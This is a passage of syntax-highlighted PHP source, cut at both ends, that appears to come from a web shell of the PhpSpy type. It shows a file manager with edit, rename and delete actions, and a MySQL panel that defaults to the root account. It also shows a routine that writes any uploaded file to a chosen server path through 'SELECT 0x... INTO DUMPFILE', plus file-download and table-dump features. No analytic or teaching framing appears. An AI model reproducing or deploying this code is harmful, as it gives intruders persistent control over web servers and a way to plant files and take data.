<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:rename(\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;Rena</span><span style="color: #8abeb7; text-decoration: underline;">me&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">file_i</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #8abeb7; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>).<span style="color: #8abeb7;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t</span><span style="color: #8abeb7; text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dir_i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' directories / '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">file_i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' files&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">end dir</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'sqlfile'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">doing</span>==<span style="color: #8abeb7;">"mysqlupload"</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">file</span> = $<span style="color: #81a2be;">_FILES</span>[<span style="color: #8abeb7;">'uploadfile'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filename</span> = $<span style="color: #f0c674;">file</span>[<span style="color: #8abeb7;">'tmp_name'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">file_exists(</span>$<span style="color: #f0c674;">savepath</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'The goal file has already existed'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!$<span style="color: #f0c674;">filename</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Please choose a file'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">contents</span>=@<span style="color: #c5c8c6; background-color: #1d1f21;">fread(</span>$<span style="color: #f0c674;">fp</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">filename</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">contents</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bin2hex(</span>$<span style="color: #f0c674;">contents</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!$<span style="color: #f0c674;">upname</span>) $<span style="color: #f0c674;">upname</span> = $<span style="color: #f0c674;">file</span>[<span style="color: #8abeb7;">'name'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>,$<span style="color: #f0c674;">charset</span>,$<span style="color: #f0c674; text-decoration: underline;">dbport</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE </span><span style="color: #8abeb7; text-decoration: underline;">'$savepath';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span>$<span style="color: #f0c674;">result</span> ? <span style="color: #8abeb7;">'Upload success'</span> : <span style="color: #8abeb7;">'Upload has failed: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_error</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="color: #b294bb;">?&gt;</span>
<span style="color: #81a2be;">&lt;script</span> <span style="color: #81a2be;">type=</span><span style="color: #8abeb7;">"text/javascript"</span><span style="color: #81a2be;">&gt;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">mysqlfile</span>(<span style="color: #cc6666; font-weight: bold;">doing</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!<span style="color: #cc6666; font-weight: bold;">doing</span>) <span style="color: #b5bd68;">return</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'doing'</span>).<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #cc6666; font-weight: bold;">doing</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #cc6666; font-weight: bold;">dbhost</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'dbinfo'</span>).<span style="color: #cc6666; font-weight: bold;">dbhost</span>.<span style="color: #cc6666; font-weight: bold;">value</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #cc6666; font-weight: bold;">dbport</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'dbinfo'</span>).<span style="color: #cc6666; font-weight: bold;">dbport</span>.<span style="color: #cc6666; font-weight: bold;">value</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #cc6666; font-weight: bold;">dbuser</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'dbinfo'</span>).<span style="color: #cc6666; font-weight: bold;">dbuser</span>.<span style="color: #cc6666; font-weight: bold;">value</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #cc6666; font-weight: bold;">dbpass</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'dbinfo'</span>).<span style="color: #cc6666; font-weight: bold;">dbpass</span>.<span style="color: #cc6666; font-weight: bold;">value</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #cc6666; font-weight: bold;">dbname</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'dbinfo'</span>).<span style="color: #cc6666; font-weight: bold;">dbname</span>.<span style="color: #cc6666; font-weight: bold;">value</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #cc6666; font-weight: bold;">charset</span>.<span style="color: #cc6666; font-weight: bold;">value</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'dbinfo'</span>).<span style="color: #cc6666; font-weight: bold;">charset</span>.<span style="color: #cc6666; font-weight: bold;">value</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$(</span><span style="color: #8abeb7;">'mysqlfile'</span>).<span style="color: #c5c8c6; background-color: #1d1f21;">submit(</span>);
}
<span style="color: #81a2be;">&lt;/script&gt;</span>
<span style="color: #b294bb;">&lt;?php</span>
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dbhost</span> &amp;&amp; $<span style="color: #f0c674;">dbhost</span> = <span style="color: #8abeb7;">'localhost'</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dbuser</span> &amp;&amp; $<span style="color: #f0c674;">dbuser</span> = <span style="color: #8abeb7;">'root'</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dbport</span> &amp;&amp; $<span style="color: #f0c674;">dbport</span> = <span style="color: #8abeb7;">'3306'</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=<span style="color: #81a2be;">&gt;</span><span style="color: #8abeb7;">'MYSQL Information'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbinfo'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'sqlfile'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBHost:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbhost'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">20</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbhost</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">':'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">4</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbport</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBUser:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbuser'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">15</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbuser</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBPass:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbpass'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">15</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbpass</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBName:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbname'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">15</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbname</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBCharset:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeselect(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'charset'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;$<span style="color: #f0c674;">charsetdb</span>,<span style="color: #8abeb7;">'selected'</span>=&gt;$<span style="color: #f0c674;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST" enctype="multipart/form-data" name</span><span style="color: #8abeb7; text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty</span><span style="color: #8abeb7; text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /</span><span style="color: #8abeb7; text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dbhost'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dbport'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dbuser'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dbpass'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dbname'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'charset'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'doing'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'sqlfile'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
}

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'mysqladmin'</span>) {
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dbhost</span> &amp;&amp; $<span style="color: #f0c674;">dbhost</span> = <span style="color: #8abeb7;">'localhost'</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dbuser</span> &amp;&amp; $<span style="color: #f0c674;">dbuser</span> = <span style="color: #8abeb7;">'root'</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dbport</span> &amp;&amp; $<span style="color: #f0c674;">dbport</span> = <span style="color: #8abeb7;">'3306'</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> = <span style="color: #8abeb7;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbhost</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbhost\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbuser</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbuser\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbpass</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbpass\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbport</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbport\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbname</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbname\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">charset</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value</span><span style="color: #8abeb7; text-decoration: underline;">=\"$charset\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'backupmysql'</span> &amp;&amp; $<span style="color: #f0c674;">saveasfile</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">table</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Please choose the table'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>,$<span style="color: #f0c674;">charset</span>,$<span style="color: #f0c674;">dbpo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fp</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">fopen(</span>$<span style="color: #f0c674;">path</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">fp</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">table</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">k</span> =&gt; $<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">sqldumptable(</span>$<span style="color: #f0c674;">v</span>, $<span style="color: #f0c674;">fp</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">fp</span>);<span style="color: #cc6666; background-color: #373b41;">                </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fileurl</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #cc6666; font-weight: bold;">SA_ROOT</span>,<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">path</span>);
